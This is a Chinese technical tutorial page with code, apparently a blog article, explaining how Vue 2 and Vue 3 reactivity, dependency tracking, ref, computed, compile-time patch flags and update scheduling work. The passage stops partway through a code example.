.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🏗️ <strong>核心架构概览</strong></h2>
<h3 data-id="heading-1">1. <strong>响应式系统三层架构</strong></h3>
<pre><code class="hljs language-text" lang="text">┌─────────────────────────────────────────┐
│           组件渲染系统 (Renderer)        │
├─────────────────────────────────────────┤
│         响应式系统 (Reactivity)          │
│  ┌─────────────┐  ┌──────────────────┐  │
│  │  依赖收集    │  │  触发更新         │  │
│  │  (Track)    │  │  (Trigger)       │  │
│  └─────────────┘  └──────────────────┘  │
├─────────────────────────────────────────┤
│       原始响应式对象 (Raw Objects)       │
└─────────────────────────────────────────┘
</code></pre>
<h2 data-id="heading-2">🔄 <strong>Vue 2 vs Vue 3 响应式原理对比</strong></h2>
<h3 data-id="heading-3">2. <strong>Vue 2: Object.defineProperty</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2 响应式实现简化版</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">defineReactive</span>(<span class="hljs-params">obj, key, val</span>) {
  <span class="hljs-comment">// 为每个属性创建 Dep（依赖收集器）</span>
  <span class="hljs-keyword">const</span> dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dep</span>()
  
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, key, {
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// 依赖收集</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span>) {
        dep.<span class="hljs-title function_">depend</span>()  <span class="hljs-comment">// 收集当前 watcher</span>
      }
      <span class="hljs-keyword">return</span> val
    },
    <span class="hljs-title function_">set</span>(<span class="hljs-params">newVal</span>) {
      <span class="hljs-keyword">if</span> (newVal === val) <span class="hljs-keyword">return</span>
      val = newVal
      <span class="hljs-comment">// 触发更新</span>
      dep.<span class="hljs-title function_">notify</span>()
    }
  })
}

<span class="hljs-comment">// 递归对象实现深度响应式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">observe</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> || obj === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// 递归处理对象属性</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
    <span class="hljs-title function_">defineReactive</span>(obj, key, obj[key])
  })
}

<span class="hljs-comment">// Vue 2 的局限性：</span>
<span class="hljs-comment">// 1. 无法检测对象属性的添加/删除</span>
<span class="hljs-comment">// 2. 数组变异方法需要特殊处理</span>
<span class="hljs-comment">// 3. 性能问题：递归遍历所有属性</span>
</code></pre>
<h3 data-id="heading-4">3. <strong>Vue 3: Proxy + Reflect</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 3 响应式实现简化版</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-comment">// 创建响应式处理器</span>
  <span class="hljs-keyword">const</span> handler = {
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
      <span class="hljs-comment">// 依赖收集</span>
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-comment">// 深度响应式：如果值是对象，递归处理</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> &amp;&amp; result !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(result)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
      <span class="hljs-keyword">const</span> oldValue = target[key]
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver)
      
      <span class="hljs-comment">// 只有值变化时才触发更新</span>
      <span class="hljs-keyword">if</span> (oldValue !== value) {
        <span class="hljs-comment">// 触发更新</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> hasKey = <span class="hljs-title function_">hasOwn</span>(target, key)
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key)
      
      <span class="hljs-keyword">if</span> (hasKey &amp;&amp; result) {
        <span class="hljs-comment">// 触发更新</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">has</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(target, key)
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">ownKeys</span>(<span class="hljs-params">target</span>) {
      <span class="hljs-title function_">track</span>(target, <span class="hljs-variable constant_">ITERATE_KEY</span>)  <span class="hljs-comment">// 追踪迭代操作</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(target)
    }
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler)
}

<span class="hljs-comment">// Vue 3 的优势：</span>
<span class="hljs-comment">// 1. 支持对象属性的添加/删除</span>
<span class="hljs-comment">// 2. 更好的性能（惰性代理）</span>
<span class="hljs-comment">// 3. 支持 Map、Set 等集合类型</span>
<span class="hljs-comment">// 4. 更精细的依赖追踪</span>
</code></pre>
<h2 data-id="heading-5">🎯 <strong>核心概念详解</strong></h2>
<h3 data-id="heading-6">4. <strong>依赖收集 (Track)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 全局的依赖收集栈</span>
<span class="hljs-keyword">let</span> activeEffect = <span class="hljs-literal">null</span>
<span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()  <span class="hljs-comment">// 目标对象 → 键 → 依赖集合</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-keyword">if</span> (!activeEffect) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// 获取目标对象的依赖映射</span>
  <span class="hljs-keyword">let</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) {
    targetMap.<span class="hljs-title function_">set</span>(target, (depsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()))
  }
  
  <span class="hljs-comment">// 获取属性的依赖集合</span>
  <span class="hljs-keyword">let</span> dep = depsMap.<span class="hljs-title function_">get</span>(key)
  <span class="hljs-keyword">if</span> (!dep) {
    depsMap.<span class="hljs-title function_">set</span>(key, (dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()))
  }
  
  <span class="hljs-comment">// 收集当前 effect</span>
  dep.<span class="hljs-title function_">add</span>(activeEffect)
  activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(dep)  <span class="hljs-comment">// 反向记录，用于清理</span>
}

<span class="hljs-comment">// Effect 类（相当于 Vue 2 的 Watcher）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveEffect</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">fn, scheduler</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fn</span> = fn
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">scheduler</span> = scheduler
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deps</span> = []  <span class="hljs-comment">// 依赖此 effect 的所有 dep</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">true</span>
  }
  
  <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    
    <span class="hljs-comment">// 保存当前 effect，开始依赖收集</span>
    <span class="hljs-keyword">const</span> lastEffect = activeEffect
    activeEffect = <span class="hljs-variable language_">this</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-comment">// 恢复之前的 effect</span>
      activeEffect = lastEffect
    }
  }
  
  <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) {
      <span class="hljs-comment">// 清理所有依赖</span>
      <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-variable language_">this</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">false</span>
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-params">effect</span>) {
  <span class="hljs-keyword">const</span> { deps } = effect
  deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">dep</span> =&gt;</span> {
    dep.<span class="hljs-title function_">delete</span>(effect)
  })
  deps.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>
}
</code></pre>
<h3 data-id="heading-7">5. <strong>触发更新 (Trigger)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key, type = <span class="hljs-string">'SET'</span></span>) {
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// 获取该属性的依赖 effects</span>
  <span class="hljs-keyword">const</span> effects = depsMap.<span class="hljs-title function_">get</span>(key)
  
  <span class="hljs-comment">// 获取迭代操作的依赖（用于 for...in, Object.keys 等）</span>
  <span class="hljs-keyword">const</span> iterateEffects = depsMap.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">ITERATE_KEY</span>)
  
  <span class="hljs-keyword">const</span> effectsToRun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  
  <span class="hljs-comment">// 收集需要执行的 effects</span>
  <span class="hljs-keyword">if</span> (effects) {
    effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (effect !== activeEffect) {
        effectsToRun.<span class="hljs-title function_">add</span>(effect)
      }
    })
  }
  
  <span class="hljs-comment">// 对于添加/删除属性，需要触发迭代依赖</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'ADD'</span> || type === <span class="hljs-string">'DELETE'</span>) {
    <span class="hljs-keyword">if</span> (iterateEffects) {
      iterateEffects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (effect !== activeEffect) {
          effectsToRun.<span class="hljs-title function_">add</span>(effect)
        }
      })
    }
  }
  
  <span class="hljs-comment">// 执行 effects</span>
  effectsToRun.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()  <span class="hljs-comment">// 调度执行（用于 computed、watch）</span>
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()  <span class="hljs-comment">// 立即执行</span>
    }
  })
}
</code></pre>
<h2 data-id="heading-8">⚡ <strong>响应式 API 实现</strong></h2>
<h3 data-id="heading-9">6. <strong>ref 实现原理</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, shallow = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = shallow ? value : <span class="hljs-title function_">toReactive</span>(value)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = value
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__v_isRef</span> = <span class="hljs-literal">true</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> = shallow
    
    <span class="hljs-comment">// 为 ref 创建依赖集合</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 依赖收集</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasChanged</span>(newVal, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = newVal
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> ? newVal : <span class="hljs-title function_">toReactive</span>(newVal)
      <span class="hljs-comment">// 触发更新</span>
      <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">if</span> (activeEffect) {
    ref.<span class="hljs-property">dep</span>.<span class="hljs-title function_">add</span>(activeEffect)
    activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(ref.<span class="hljs-property">dep</span>)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">const</span> effects = ref.<span class="hljs-property">dep</span>
  effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()
    }
  })
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">toReactive</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value
}
</code></pre>
<h3 data-id="heading-10">7. <strong>computed 实现原理</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputedRefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">getter, setter</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_getter</span> = getter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span> = setter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-literal">undefined</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment">// 脏检查标志</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReactiveEffect</span>(
      getter,
      <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// 当依赖变化时，标记为脏</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>
          <span class="hljs-comment">// 触发依赖 computed 的 effects</span>
          <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
        }
      }
    )
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 依赖收集</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    
    <span class="hljs-comment">// 如果脏了，重新计算</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">false</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_setter</span>(newVal)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Write operation failed: computed value is readonly'</span>)
    }
  }
}
</code></pre>
<h2 data-id="heading-11">🔧 <strong>编译时优化</strong></h2>
<h3 data-id="heading-12">8. <strong>Patch Flags 优化</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模板编译优化示例</span>
<span class="hljs-comment">// 编译前模板</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>静态内容<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ dynamic }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"className"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="hljs-comment">// 编译后代码</span>
<span class="hljs-keyword">import</span> { createElementVNode <span class="hljs-keyword">as</span> _createElementVNode } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>

<span class="hljs-keyword">const</span> _hoisted_1 = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-title function_">_createElementVNode</span>(
  <span class="hljs-string">"span"</span>, 
  <span class="hljs-literal">null</span>, 
  <span class="hljs-string">"静态内容"</span>,
  -<span class="hljs-number">1</span> <span class="hljs-comment">/* HOISTED */</span>
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">_ctx, _cache</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">_createElementVNode</span>(
    <span class="hljs-string">"div"</span>, 
    <span class="hljs-literal">null</span>, [
      _hoisted_1,  <span class="hljs-comment">// 静态节点提升</span>
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"span"</span>, 
        <span class="hljs-literal">null</span>, 
        <span class="hljs-title function_">_toDisplayString</span>(_ctx.<span class="hljs-property">dynamic</span>),
        <span class="hljs-number">1</span> <span class="hljs-comment">/* TEXT */</span>
      ),
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"div"</span>, 
        {
          <span class="hljs-attr">class</span>: <span class="hljs-title function_">normalizeClass</span>(_ctx.<span class="hljs-property">className</span>)
        },
        <span class="hljs-literal">null</span>,
        <span class="hljs-number">2</span> <span class="hljs-comment">/* CLASS */</span>
      )
    ],
    <span class="hljs-number">0</span> <span class="hljs-comment">/* 无标志 */</span>
  )
}

<span class="hljs-comment">// Patch Flags 类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">PatchFlags</span> = {
  <span class="hljs-attr">TEXT</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment">// 动态文本</span>
  <span class="hljs-attr">CLASS</span>: <span class="hljs-number">2</span>,       <span class="hljs-comment">// 动态 class</span>
  <span class="hljs-attr">STYLE</span>: <span class="hljs-number">4</span>,       <span class="hljs-comment">// 动态 style</span>
  <span class="hljs-attr">PROPS</span>: <span class="hljs-number">8</span>,       <span class="hljs-comment">// 动态 props</span>
  <span class="hljs-attr">FULL_PROPS</span>: <span class="hljs-number">16</span>, <span class="hljs-comment">// 动态 key，需要全量 diff</span>
  <span class="hljs-attr">HYDRATE_EVENTS</span>: <span class="hljs-number">32</span>,
  <span class="hljs-attr">STABLE_FRAGMENT</span>: <span class="hljs-number">64</span>,
  <span class="hljs-attr">KEYED_FRAGMENT</span>: <span class="hljs-number">128</span>,
  <span class="hljs-attr">UNKEYED_FRAGMENT</span>: <span class="hljs-number">256</span>,
  <span class="hljs-attr">NEED_PATCH</span>: <span class="hljs-number">512</span>,
  <span class="hljs-attr">DYNAMIC_SLOTS</span>: <span class="hljs-number">1024</span>,
  <span class="hljs-attr">HOISTED</span>: -<span class="hljs-number">1</span>,    <span class="hljs-comment">// 静态提升</span>
  <span class="hljs-attr">BAIL</span>: -<span class="hljs-number">2</span>        <span class="hljs-comment">// 特殊情况</span>
}
</code></pre>
<h3 data-id="heading-13">9. <strong>Tree Flattening（树结构打平）</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// 优化前的 VNode 结构
{
  type: 'div',
  children: [
    { type: 'p', children: '静态内容' },
    { type: 'span', children: [/* 动态内容 */] },
    { type: 'div', children: [/* 更多嵌套 */] }
  ]
}

// 优化后的 VNode 结构
{
  type: 'div',
  children: [
    { type: 'p', children: '静态内容' },
    // 动态节点被提取到单独的数组中
  ],
  // 动态子节点被收集到这里
  dynamicChildren: [
    { type: 'span', patchFlag: 1 },
    { type: 'div', patchFlag: 2 }
  ]
}

// 更新时只 diff dynamicChildren，跳过静态节点
</code></pre>
<h2 data-id="heading-14">📊 <strong>响应式性能优化</strong></h2>
<h3 data-id="heading-15">10. <strong>依赖收集优化</strong></h3>
<pre><code class="hljs language-javascr" lang="javascr">// 1. 惰性依赖收集
let shouldTrack = true

function pauseTracking() {
  shouldTrack = false
}

function enableTracking() {
  shouldTrack = true
}

function track(target, key) {
  if (!shouldTrack || !activeEffect) return
  // ... 原有的 track 逻辑
}

// 2. 批量更新
let isFlushing = false
let queue = []

function queueJob(job) {
  if (!queue.includes(job)) {
    queue.push(job)
  }
  
  // 下一个 tick 执行所有更新
  if (!isFlushing) {
    isFlushing = true
    Promise.resolve().then(() =&gt; {
      try {
        queue.forEach(job =&gt; job())
      } finally {
        queue.length = 0
        isFlushing = false
      }
    })
  }
}

// 3. 响应式层级的优化
const RAW = '__v_raw'  // 原始对象标记

function toRaw(observed) {
  const raw = observed &amp;&amp; observed[RAW]
  return raw ? toRaw(raw) : observed
}

// 避免深层代理的重复创建
const proxyMap = new WeakMap()

function createReactiveObject(target) {
  // 检查是否已经有代理
  const existingProxy = proxyMap.get(target)
  if (existingProxy) {
    return existingProxy
  }
  
  const proxy = new Proxy(target, handlers)
  proxyMap.set(target, proxy)
  return proxy
}
</code></pre>
<h2 data-id="heading-16">🔄 <strong>响应式系统的调度机制</strong></h2>
<h3 data-id="heading-17">11. <strong>更新队列与调度器</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// 响应式任务调度器
const queue = []
let isFlushing = false
const resolvedPromise = Promise.resolve()

function queueFlush() {
  if (!isFlushing &amp;&amp; !queue.length) {
    isFlushing = true
    resolvedPromise.then(flushJobs)
  }
}

function flushJobs() {
  try {
    // 先执行所有前置任务
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (job.pre) {
          job()
        }
      }
    }
    
    // 执行组件更新
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (!job.pre) {
          job()
        }
      }
    }
  } finally {
    // 清空队列
    queue.length = 0
    isFlushing = false
    
    // 执行后置任务
    // flushPostFlushCbs()
  }
}

// watch 的调度实现
function watch(source, cb, options = {}) {
  const { flush = 'sync' } = options
  
  let scheduler
  if (flush === 'sync') {
    scheduler = job =&gt; job()  // 同步执行
  } else if (flush === 'pre') {
    scheduler = job =&gt; queueJob(job)  // 组件更新前
  } else { // 'post'
    scheduler = job =&gt; queuePostFlushCb(job)  // 组件更新后
  }
  
  const effect = new ReactiveEffect(getter, scheduler)
  // ...
}
</code></pre>
<h2 data-id="heading-18">🎯 <strong>响应式系统的边界情况</strong></h2>
<h3 data-id="heading-19">12. <strong>循环引用处理</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 WeakMap 避免循环引用</span>
<span class="hljs-keyword">const</span> reactiveMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// 如果已经代理过，直接返回</span>
  <span class="hljs-keyword">const</span> existing = reactiveMap.<span class="hljs-title function_">get</span>(obj)
  <span class="hljs-keyword">if</span> (existing) <span class="hljs-keyword">return</span> existing
  
  <span class="hljs-comment">// 如果对象有循环引用标记，跳过</span>
  <span class="hljs-keyword">if</span> (obj &amp;&amp; obj.<span class="hljs-property">__v_skip</span>) {
    <span class="hljs-keyword">return</span> obj
  }
  
  <span class="hljs-keyword">const</span> proxy = <span class="hljs-title function_">createReactiveObject</span>(obj)
  reactiveMap.<span class="hljs-title function_">set</span>(obj, proxy)
  <span class="hljs-keyword">return</span> proxy
}

<span class="hljs-comment">// 标记跳过响应式的对象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">markRaw</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(value, <span class="hljs-string">'__v_skip'</span>, {
    <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>
  })
  <span class="hljs-keyword">return</span> value
}
</code></pre>
<h3 data-id="heading-20">13. <strong>大对象的性能优化</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 浅层响应式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shallowReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target, <span class="hljs-literal">true</span>)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target, shallow = <span class="hljs-literal">false</span></span>) {
  <span class="hljs-keyword">const</span> handlers = shallow ? shallowHandlers : baseHandlers
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// 浅层 handlers</span>
<span class="hljs-keyword">const</span> shallowHandlers = {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
    <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
    <span class="hljs-title function_">track</span>(target, key)
    
    <span class="hljs-comment">// 关键区别：不递归处理嵌套对象</span>
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment">// 直接返回，不再包装</span>
  },
  <span class="hljs-comment">// ... 其他 handlers</span>
}

<span class="hljs-comment">// 惰性响应式：只在实际访问时进行代理</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">let</span> proxyCache = <span class="hljs-literal">null</span>
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
